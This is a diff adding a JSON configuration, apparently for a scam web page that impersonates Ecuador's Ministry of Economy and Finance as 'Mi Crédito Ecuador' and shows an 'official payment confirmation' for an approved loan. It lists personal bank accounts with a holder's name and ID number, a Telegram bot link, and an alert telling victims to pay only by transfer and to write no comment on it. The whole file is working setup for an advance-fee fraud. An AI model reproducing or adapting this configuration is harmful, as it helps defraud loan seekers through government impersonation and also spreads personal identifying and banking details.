@@ -1,0 +1,34 @@
+{
+    "banks": {
+        "pichincha": {
+            "enabled": true,
+            "name": "Banco Pichincha",
+            "account_type": "Cuenta de Ahorros",
+            "account_number": "2201234567",
+            "cedula": "1723456789",
+            "full_name": "Mateo Alejandro Ram\u00edrez Su\u00e1rez",
+            "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/Banco_Pichincha_logo.svg/200px-Banco_Pichincha_logo.svg.png"
+        },
+        "pacifico": {
+            "enabled": true,
+            "name": "Banco del Pac\u00edfico",
+            "account_type": "Cuenta Corriente",
+            "account_number": "3309876543",
+            "cedula": "1723456789",
+            "full_name": "Mateo Alejandro Ram\u00edrez Su\u00e1rez",
+            "logo": "https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/Banco_del_Pac%C3%ADfico_logo.svg/200px-Banco_del_Pac%C3%ADfico_logo.svg.png"
+        }
+    },
+    "telegram": "https://t.me/micreditosecuador_bot",
+    "page": {
+        "country_title": "REP\u00daBLICA DEL ECUADOR",
+        "ministry": "Ministerio de Econom\u00eda y Finanzas",
+        "title": "Confirmaci\u00f3n Oficial de Pago",
+        "service_name": "MI CR\u00c9DITO ECUADOR",
+        "service_type": "ACREDITACI\u00d3N DE CR\u00c9DITO APROBADO"
+    },
+    "alert": {
+        "enabled": true,
+        "text": "<strong>Importante:<\/strong> Realiza el pago \u00fanicamente mediante transferencia bancaria (SPI \/ Banco Pichincha \/ Banco del Pac\u00edfico \/ Produbanco).<br>No escribas comentarios en la transferencia."
+    }
+}
